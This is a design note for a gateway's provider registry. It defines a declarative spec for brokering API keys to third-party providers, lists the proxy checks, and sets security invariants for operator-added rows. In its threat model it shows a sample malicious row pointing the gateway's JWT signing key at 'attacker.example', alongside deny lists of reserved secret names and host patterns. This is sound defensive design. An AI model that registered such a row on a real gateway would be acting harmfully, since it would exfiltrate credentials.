# The provider registry: every API provider as data

Date: 2026-10-25. Status: design (PR 1 of five); what each later PR builds is section 9. Reviewed before it opened by a Workflow of four lenses (security, correctness against the code, contracts with siblings and docs, product) with two refuters per finding; 40 of 42 findings held and are folded in below, the two largest being the key-binding rule in section 6 and the AI-host rule in section 9. Ben's ask, the evening of 2026-10-24: "Right now we hard-code support for each provider in the gateway. I wonder if there's an MCP tool or a CLI command so we can support generally any provider: all you need to do is register it. Change it to a registry pattern instead of hard-coded: here's what the secret needs to be, here's the API docs, here's the endpoint, here's how you authenticate to it or the authentication options. Make it general so people can add whatever they want to the gateway super easily. Then we can also super easily support hundreds and hundreds of API providers, essentially everything, super quickly."

Two words to keep apart. An **API provider** is an API the Gateway holds a key for and brokers calls to (DataForSEO, Stripe); apps list one under `capabilities` and call it with `integrationFetch()`. An **MCP app** (tier `provider` in the code, `everyapp mcp on`, [2026-10-mcp-provider-apps.md](2026-10-mcp-provider-apps.md)) is an app with no page whose tools the Gateway serves on `/mcp`. An MCP app is built on an API provider's entry (DataForSEO's tools call DataForSEO through the same proxy); the registry below is the layer underneath, and nothing here changes MCP apps. The MCP-by-URL thread (a remote MCP server as an MCP app) shares the auth block of section 2 and the secret-name rule of section 6, agreed on 2026-10-25.

## 2. The provider spec

One declarative shape, `ProviderSpec`, for every provider. The built-in catalog is written in TypeScript (so an app's `integrationFetch({ provider })` keeps its typed ids), and `everyapp provider add` takes the same shape as JSON. One parser (`parseProviderSpec`, in `@every-app/sdk/internal`) validates both for the API-key kinds; an AI provider or an OAuth client is a catalog entry only in this slice (the parser refuses `mode: "ai"` and `auth.kind: "oauth2-user"` for a row, naming why), so the TypeScript fields those keep (RegExp token paths, scope policies, the `ai` block) never have to be JSON.

```jsonc
{
  "id": "stripe",                          // ^[a-z][a-z0-9-]{1,39}$; never a catalog id, never `everyapp`
  "name": "Stripe",
  "description": "Payments: customers, subscriptions, invoices.",
  "docs": "https://dashboard.stripe.com/apikeys",   // where the person gets the key (required, https)
  "api": "https://docs.stripe.com/api",             // the API reference (optional)
  "hosts": ["api.stripe.com"],                      // the only hosts the key is ever sent to (section 5)
  "auth": { "kind": "bearer", "secret": "STRIPE_API_KEY" },   // a setting named after the provider (section 6)
  "secrets": [{ "name": "STRIPE_API_KEY", "hint": "A restricted key with read access to Customers and Charges is enough." }],
  "access": ["read", "write"],                      // what an app may ask for; default ["read"]
  "readMethods": ["GET", "HEAD"],                   // default; a provider whose reads are POSTs lists POST
  "writeMethods": ["POST", "PUT", "PATCH", "DELETE"], // what `access: "write"` adds; default as shown
  "accountWidePaths": [["v1", "account"], ["v1", "api_keys"]], // segment runs refused however spelled (today's rule, today's name)
  "data": "account",                                // or "per-call": whether the key's data is one account's (section 5)
  "hint": "A restricted key from the Stripe dashboard with the permissions the app's `why` names; the Gateway puts it on every call as a bearer token.",
  "smoke": { "method": "GET", "path": "/v1/balance", "expect": [200], "free": true },   // one request that costs nothing (section 7)
  "cost": { "unit": "call", "usd": 0, "note": "Free; Stripe charges per transaction, not per call." },
  "rate": { "perSecond": 100, "note": "Live mode; test mode 25/s." },
  "example": "list my latest Stripe customers",   // for agents and the MCP app dialog
  "verified": { "on": "2026-10-25", "how": "docs" } // or false: an entry nobody checked against the provider's docs
}
```

**Auth kinds.** Four are data, two are named adapters, and one is a slot that stays empty until someone needs it. `secret` is always the name of a Gateway setting, never a value. The spelling is the one the MCP-by-URL thread uses for a remote MCP app's credential (`bearer`, `header` with `prefix`, `basic`), so the two look alike.

| `auth.kind` | What the Gateway puts on the request | Secrets it names | Example |
| --- | --- | --- | --- |
| `bearer` | `Authorization: Bearer <secret>` (`scheme` overrides the word: `Token`, `Api-Key`) | `secret` | Context.dev, Stripe, OpenAI |
| `header` | `<header>: <prefix><secret>`; the header is an RFC 7230 token and never one the Gateway sets or strips itself (`host`, `cookie`, `content-length`, `transfer-encoding`, `x-everyapp-*`, …) | `secret` | Anthropic's `x-api-key`, Klaviyo's `Authorization: Klaviyo-API-Key {key}` |
| `query` | `?<param>=<secret>`, with the app's own copy of the parameter dropped first. The key is then in the URL, so a 3xx answer is never passed on (section 5), and the kind is for providers verified not to echo the request URL in error bodies | `secret` | OpenWeather, Mapbox |
| `basic` | `Authorization: Basic base64(user:password)`, with the placement said outright, never guessed: `user: "<literal>"` (the secret is the password: Mailgun's `api`), `user: { secret }` (two settings: Twilio's SID and token), `user: "key"` (the secret is the username and the password is empty: Segment, Mixpanel, Crisp), or `pair: true` (the secret is `login:password`, or that pair already base64-encoded: DataForSEO's rule, which the catalog alone uses) | `secret`, and `user.secret` when named | DataForSEO, Mailgun, Twilio, Segment |
| `oauth2-client-credentials` | Exchanges `clientId` and `clientSecret` at `tokenUrl` for a bearer token, then as `bearer`. Not in this slice: its own PR, with `tokenUrl` an https URL whose host passes the host rules of section 6, the exchange made with `redirect: "manual"`, a capped answer and name-only error logs (the OAuth path's four guards), and a per-isolate cache keyed by the provider id and a digest of its hosts and auth, dropped when the row changes | `clientId`, `clientSecret` | Named adapter |
| `oauth2-user` | Today's `oauth_client`: the Gateway completes the provider's token endpoints with its client and refuses everything else; the app keeps the person's tokens. Catalog only: its TypeScript fields stay verbatim (`token[]` with string or RegExp paths, `hostSetting`, `authorize`, `scopePolicy`), and a row with this kind is refused until a later note says what a row may carry | `clientId`, `clientSecret`, `hostSetting` | Named adapters per dialect: `google`, `microsoft`, `slack` |
| `signed` | Reserved: AWS SigV4, HMAC-signed bodies, Twitter's OAuth 1.0a | | Not declarative; each is an adapter added as code, with its own register rows |

What cannot be declarative, and why: an OAuth user flow's quirks (what the token response says it granted, the versioned paths, a token exchange that follows the first exchange) live in the adapter and its dialect; a signed request needs the secret at signing time over the whole body, which the proxy would have to buffer and canonicalize per scheme. Both plug in as named auth adapters: a `kind` the parser accepts only when the Gateway running it has the adapter. A fixed header a provider requires on every call (`anthropic-version`, `Notion-Version`) is the app's to send: the proxy forwards an app's ordinary headers, so the spec needs no `headers` field.

**Per-account hosts.** Shopify is `<shop>.myshopify.com`, Supabase `<ref>.supabase.co`, Turso and Neon per-database. An API-key spec may name `hostSetting` instead of (or beside) `hosts`: one Gateway setting, named after the provider like its key (`SHOPIFY_HOST`), holding a bare host or an https origin with no path, resolved the way an OAuth client's instance is (`oauthClientOrigin`) and run through the host rules of section 6 at read time. An entry with neither is refused.

**Whose data.** `data: "per-call"` (search, scrape, inference, weather: each call is its own) or `"account"` (Stripe, Airtable, Linear: every list is the whole account). The field exists because the shared-key model holds for one organization and not for many: section 5 says what the gateway does with it.

**AI providers** are catalog entries with an `ai` block (`origin`, `inferenceRoutes`, `unstoredRoutes`, `extraRoutes`, `basePath` with `{SETTING}` placeholders, `normalize: "workers-ai"` for the one response rewrite). The gateway's `AI_PROVIDERS` and the SDK's `DEV_AI_PROVIDERS` are both derived from these entries, so OpenAI, OpenRouter and Workers AI become catalog entries and the two copies go. A placeholder is filled from the Gateway's settings with `encodeURIComponent(value.trim())` and resolves only to a setting the entry names under `alsoNeeds` (Workers AI's `CLOUDFLARE_ACCOUNT_ID`), never to an arbitrary one; a blank placeholder setting is `ai_provider_not_configured` naming the key and the setting, as today. An entry with `ai` is reached as today, under `providers` in the manifest and `/api/ai/<id>` on the binding, with the AI proxy's rules (inference only, `store: false`, the model allowlist, the usage tap), and its `auth` is any API-key kind (Anthropic's `x-api-key` header, say), not only bearer. It is never a capability: `isCapabilityId` knows it, but `parseIntegrationProxyPath` answers null for it (so `/api/integrations/openrouter/…` is `400 invalid_integration_route`), the strict validator refuses `capabilities: { openrouter }` with "list it under providers", and the settings model skips it under `capabilities`; a test pins all three. A row never carries `ai` in this slice. Folding the two routes into one is the October redesign's job, not this one's.

**Services** (email, members) stay what they are: the Gateway does the work; no host, no spec.

## 3. Where specs live

| Source | What | Who edits it | How the Gateway reads it |
| --- | --- | --- | --- |
| The built-in catalog | `packages/sdk/src/internal/capabilities.ts` (today's entries, re-expressed as specs) and `packages/sdk/src/internal/catalog/*.ts` (the first batch of fifty, PR 3), merged into `CAPABILITIES` | A pull request; the drift tests below hold it to its docs | Statically, as today |
| Per-gateway rows | A D1 table `providers` (`id`, `spec` JSON, `added_by`, `added_at`, `updated_at`, `bound_digest`, `bound_at`), migration 0010 (the events-out thread has 0009, the MCP-by-URL thread 0011) | An operator with `everyapp provider add`; later an owner or admin through `everyapp_provider_add` (section 8) | A `ProviderRepository` cached 30 s per isolate, like the apps rows; each row re-parsed and re-checked on read and dropped (logged `provider.row_invalid` with the id and the parser's message, never the row's text) when it no longer passes the rules, so a row edited by hand in D1 fails closed |

A row is the gateway's, not an organization's: a key is a Gateway setting shared by every app, as every capability's is today. The hosted gateway gets per-organization providers when it gets per-organization keys (TODO); until then section 5's `data` rule and section 6's hosted rule keep tenants apart.

Resolution is one function, `providerRegistry(rows).get(id)`: the catalog first, then the rows. A row can't shadow a catalog id (`add` refuses it, and the resolver never looks past the catalog), so nothing a row says changes where a catalog provider's key goes. The same registry answers `bound(id)`: whether the row's key was set for the hosts and auth the row has now (section 6).

## 4. How an app asks for one

Nothing changes in the manifest. `capabilities: { stripe: { access: "read", why: "Shows the last ten charges on the dashboard." } }`, with the need fields of [docs/manifest-settings.md](../manifest-settings.md). `access: "write"` is new in effect: today every API-key provider offers read only, and the proxy forwards the read methods whatever the entry says; with the registry an entry's `access: "write"` unlocks the spec's `writeMethods` on a provider whose `access` offers write (section 5), and an agent's identity needs `mcp:write` for them, the rule email already has (`integration_read_only`). The decision is taken here, not left to TODO: without it a sender (Resend, Twilio) and a GraphQL API (Linear, Shopify) do nothing, and search, scrape and speech providers whose reads are POSTs would have to call POST a write.

**The validator and the deploy.** The strict validator (the CLI's) keeps refusing an id neither the catalog nor its lookup has, with the same message as today; `everyapp deploy` and the commands that connect first (`status`, `secret`, `configure`) validate against the gateway's registry, catalog plus rows, so a row's entry is checked as a catalog entry is (the access it offers, no scope sets) and an id nobody has is `CAPABILITY_UNKNOWN`, naming `everyapp provider add`. `everyapp dev` can't ask the Gateway, so it validates with `unknownCapabilities: "accept"` (access and need only) and warns `CAPABILITY_NOT_IN_CATALOG` for each id outside the catalog. The gateway's lenient schema never refused unknown ids, so a stored manifest is read as it is, and the proxy checks the stored entry's `access` against the spec on every call, so a hand-edited row or a stale manifest can't unlock write methods.

**The SDK at run time.** `integrationFetch({ provider })` takes a catalog id (typed) or any other string. With the binding present, an id outside the catalog goes to the gateway with only an https check, and the gateway's checks decide (its `invalid_integration_route` is the refusal for a host outside the spec's); the SDK's own host pre-check is for catalog entries, a courtesy, not the boundary. `integrationStatus` asks the gateway the same way.

**Local development.** The SDK's fallback (no binding, `EVERYAPP_DEV` set, the developer's own key in `.dev.vars` under the Gateway's name) works for every catalog provider, from the same spec the gateway uses. For a registered row, `everyAppWorker()` reads `.everyapp/providers/*.json` in the app's directory into `EVERYAPP_DEV_PROVIDERS` (written by `everyapp provider show <id> --json --save`, or by `provider add` when it runs in an app directory), and the fallback resolves the row from it with the developer's key under the spec's secret name. No file, no fallback: `integrationFetch` throws a `ConfigurationError` naming the command.

## 5. How the gateway brokers it

The proxy is `handleIntegrationProxyRequest` in `apps/every-app-gateway/src/server/integration-proxy.ts`, the one path apps' Workers and MCP apps' tools take. The registry replaces `CAPABILITIES[id]`; the checks run in the code's order (docs/capabilities.md listed them in another order and is corrected in PR 2):

1. The caller is a registered, active app (the binding's props: the AppGateway entrypoint).
2. The route: the id is a provider (not an AI one), the host is one of the spec's (or the one its `hostSetting` names), over https, with no path that could leave it (`400 invalid_integration_route`).
3. Its registry-row manifest lists the capability (`403 capability_not_requested`).
4. The path isn't one of the spec's `accountWidePaths`, however spelled (`403 integration_path_not_allowed`).
5. The method is one of the spec's `readMethods`, or one of its `writeMethods` when the entry says `access: "write"` and the spec's `access` offers write (`405 integration_method_not_allowed`, whose message says which).
6. Every Gateway setting the spec's `auth` names is set, and for a row, bound (section 6): else `503 integration_not_configured`, naming the settings and `everyapp secret set`.
7. On a hosted gateway, a provider whose `data` is `account` is refused (`503 integration_not_available_hosted`): one key would be every tenant's data until per-organization keys exist. Self-hosted gateways, which are one organization, are untouched.
8. Attribution and the monthly cap, as today (`admit`); then, for a write method, an agent's identity needs `mcp:write` (`403 integration_read_only`).

Then, as today: the app's `Authorization`, `x-api-key`, cookies, `x-everyapp-*`, hop-by-hop and forwarding headers are dropped, the spec's auth is put on (a header, or a query parameter after the app's own copy of it is removed), the call is made with `redirect: "manual"`, the answer streams back without `set-cookie`, the call is counted the moment the provider answers. The cost tap is unchanged in mechanism (a regular expression over the first 2 KiB of the decoded body for `"<field>": <number>`, where today's field is `cost` for every provider) and changes in reach: it runs only where the spec names `cost.responseField` (DataForSEO's `cost`), since a catalog of fifty would otherwise read any provider's `cost` as dollars. For a `query` provider the key is in the URL, so a 3xx answer is never passed on (`502 integration_upstream_redirected`; a server builds `Location` from the request URL), `location`, `content-location` and `refresh` are deleted from every answer, and an upstream failure logs the error's name only, as the OAuth path does, never a message that might quote the URL.

The invariants this preserves are the register's `cap.*` rows (B4): `cap.grant-required`, `cap.host-allowlist-https` (now: the spec's hosts, or its host setting), `cap.account-wide-paths-refused`, `cap.read-methods-only` (rewritten: read methods, or write methods under a write grant), `cap.credentials-stripped-no-redirect`, `cap.response-cookies-dropped`, `cap.key-existence-hidden`, `cap.logs-redacted`, `cap.per-organization-limits`. The ones it adds, for rows (section 6), get ids under `providers.` (the register's `registry.` rows are the app registry's).

## 6. What a row may say: the security boundary

An operator registering a provider is giving the Gateway a new host to send a secret to. The rows must not be able to turn that into sending an existing secret anywhere, and nobody short of the operator must be able to move a secret the operator set. The rules, enforced by `add` (a pure function in `@every-app/sdk/internal`, `checkProviderRow`, run by the CLI and later the MCP tool alike) and again by the gateway every time it reads a row:

| Id | Invariant |
| --- | --- |
| `providers.row-secret-is-its-own` | A row's setting names match `^[A-Z][A-Z0-9_]{2,63}$`, start with the row's own id upper-cased with `-` as `_` (`STRIPE_`, `TIKTOK_BUSINESS_`; every catalog entry already fits), and are nobody else's: never an install-owned setting (`JWT_PRIVATE_KEY`, `BETTER_AUTH_SECRET`, `CF_DEPLOY_TOKEN`, …), a dev-only one, a reserved prefix (`EVERYAPP_`, `EVERY_APP_`, `APP__`), a settable Gateway setting (`MCP_*`, `CLOUDFLARE_ACCESS_*`, `EMAIL_*`, every catalog key and client), another row's, or a name any registered app's manifest lists under `secrets` (`PROVIDER_SECRET_TAKEN`, naming the app). The deploy refuses the other direction too: an app's `secrets` may not name a row's setting, with the validator's wording for a Gateway name. |
| `providers.value-bound-to-hosts` | A row's value is read only for the hosts and auth it was set for. `everyapp secret set <NAME>` for a row's setting prints the row's hosts and who registered it, then records on the row a digest of its `hosts`, `hostSetting` and `auth` (`bound_digest`, `bound_at`). The gateway reads `env[NAME]` for a row only while the row's current digest equals the recorded one; a replaced, removed-and-re-added or hand-edited row answers `integration_not_configured` ("the key was set for other hosts; set it again") until the operator runs `secret set` again. So an admin who can rewrite rows (section 8) can never move a value the operator set, and a name no row claims is never read. |
| `providers.row-hosts-public-https` | Each host is a lowercase DNS name with at least one dot and no port, userinfo, path or wildcard; not an IP literal, `localhost`, or under `.localhost`, `.local`, `.internal`, `.arpa`; not the Gateway's own host and not under `APP_BASE_DOMAIN` or `THIRD_PARTY_DOMAIN` (checked on the gateway, which knows them). A `hostSetting`'s value is held to the same rules when read. Calls go over https only, with `redirect: "manual"` (`cap.credentials-stripped-no-redirect` holds for rows). |
| `providers.builtin-precedence` | A row never takes a catalog id or `everyapp`; the resolver reads the catalog before the rows; a row that stops passing the rules (a later catalog entry took its name) is skipped and logged, never served. |
| `providers.spec-names-no-values` | A spec names secrets and never holds one: the parser refuses unknown fields and free-form values, `header` and `scheme` are RFC 7230 tokens, and nothing in `provider show`, `provider list`, the MCP tools or the logs reads a value. Values move only through `everyapp secret set`, as today. |
| `providers.add-is-privileged` | `provider add|remove` runs under the Cloudflare login (ADR-0003); the MCP tools, when built (section 8), take an owner or admin over a write-scoped credential on a self-hosted gateway, are hidden on a hosted one (rows are every tenant's), take the spec as a JSON object and never a URL (the gateway fetching an admin-named URL is a request the host rules don't cover), never replace a row, and refuse to remove a row whose setting is bound. Every MCP call is audited like any built-in (an argument digest, never the spec's text). |
| `providers.write-needs-write-grant` | A method outside `readMethods` is forwarded only for an entry with `access: "write"` on a spec whose `access` offers write, and only a method in `writeMethods`; an agent identity needs `mcp:write`. |
| `providers.query-key-never-echoed` | For a `query` provider: the app's own copy of the parameter is dropped before the Gateway's is added, a 3xx answer is refused and never relayed, `location`, `content-location` and `refresh` are deleted from every answer, and the upstream-failure log carries the error's name only. |

Why `providers.row-secret-is-its-own` and `providers.value-bound-to-hosts` are the ones that matter: without the first, a row `{ id: "x", hosts: ["attacker.example"], auth: { kind: "bearer", secret: "JWT_PRIVATE_KEY" } }` plus one app call would hand the Gateway's signing key to the attacker's host; without the second, a row's own key, once set, could be pointed at any host by whoever may edit rows (replace it, or remove it and add it again under the same setting name, since the Gateway setting outlives the row). Both run on the gateway at read time, not only at `add`, because the CLI writes D1 directly and so can anyone with the Cloudflare login. The register (`docs/threat-model-invariants.md`) gets these rows with PR 2, each pinned by a test that tries the attack (the key is not sent after the row's hosts change; a row naming a catalog key is skipped; `/api/integrations/openrouter/…` is refused).

What the registry does not change: whoever can deploy an app can list any capability (as today); one key per provider, shared by every app and, on self-host, the one organization; no default spend limit beyond the opt-in monthly cap (`cap.per-organization-limits`).

The **smoke request** (`smoke`) is the spec's one free call, for the catalog page's Verify column and a later `everyapp provider check <id>` (TODO; not in this slice, since it would need the value where the CLI runs). An entry without one is marked unverified in the table.

## 8. The CLI and the MCP surface

`everyapp provider` is the group. It was the alias of `everyapp mcp` through launch week (the MCP apps reframe, [2026-10-mcp-apps-ui.md](2026-10-mcp-apps-ui.md) section 5); the alias is withdrawn for `list` and kept for `on|off` as hidden routes that run `mcp on|off` and say so, so a document that still says `provider on dataforseo` keeps working while launch week lasts; `provider list` is the registry's and, through launch week, ends with one line, `MCP apps: pnpm everyapp mcp list`. PR 2 rewrites the five places that say `provider list` or promise the whole alias (`mcp.md`, the MCP-apps design note's section 5, `SKILL.md`, `docs/capabilities.md`, `appSettings.ts`). The Agent parity thread owns the verb conventions and has these.

| Command | What it does |
| --- | --- |
| `everyapp provider add <spec.json \| https URL> [--replace]` | Parses the spec, runs the rules of section 6 against the catalog, the rows and the registered apps' manifests, writes the row. A URL is fetched over https on the operator's machine, 64 KiB at most, and parsed like a file. An existing id is refused unless `--replace`, which leaves the row unbound until `secret set` runs again; a catalog id is refused (`PROVIDER_BUILTIN`). Prints what to set next: `everyapp secret set <names>`. In an app directory, also writes `.everyapp/providers/<id>.json` for `everyapp dev` |
| `everyapp provider list` | The catalog and the rows: id, name, auth kind, hosts, whether each setting is set and bound (names only, as `secret list` reads them), which apps list it, where it is from |
| `everyapp provider show <id> [--json] [--save]` | The whole spec as JSON (what an agent reads to call it), with the hint, the smoke request, the apps that list it, and for a row who registered it; `--save` writes `.everyapp/providers/<id>.json` here |
| `everyapp provider remove <id> [--force]` | Removes a row. Refuses a catalog id, and a row an active app's manifest lists (naming the apps) unless `--force`; the Gateway's setting stays, `secret unset` removes it, and no row can read it again without a new `secret set` |

Codes: `PROVIDER_SPEC_INVALID` (the parser's message), `PROVIDER_EXISTS`, `PROVIDER_BUILTIN`, `PROVIDER_NOT_FOUND`, `PROVIDER_IN_USE`, `PROVIDER_SECRET_TAKEN`, `PROVIDER_HOST_REFUSED`, `CAPABILITY_UNKNOWN` (deploy), the warning `CAPABILITY_NOT_IN_CATALOG` (dev); the gateway's `integration_read_only`, `integration_upstream_redirected`, `integration_not_available_hosted`; every one on the errors page.

The MCP tools, on the Gateway's `/mcp` beside `everyapp_list_apps` and the others: `everyapp_provider_list` (read: the catalog and rows; which settings are set only for an owner or admin), `everyapp_provider_add` and `everyapp_provider_remove` (risk `write`: hidden from read-only connections like every write tool, refused with a tool error for a member, hidden on a hosted gateway; `add` takes the spec object only, `additionalProperties: false`, never a URL and never a replace; `remove` takes `{ id }` and refuses a bound row). They are a third kind of built-in in the ToolBus, `action`: the schema and policy in `packages/toolbus/src/builtins.ts` like the others, the handler supplied by the gateway (`ToolBusDeps.runAction`), so `everyapp dev`'s ToolBus answers "not here". The register's `toolbus.builtins-readonly-reserved` row names them. They are their own PR (section 9), after the CLI, since they bake in the role rule section 10 leaves to Ben.

Roles: the CLI is the operator (root). The MCP tools take owners and admins by default on self-host, the people who already grant apps and set caps; whether `add` should be owners only is Ben's call (TODO).
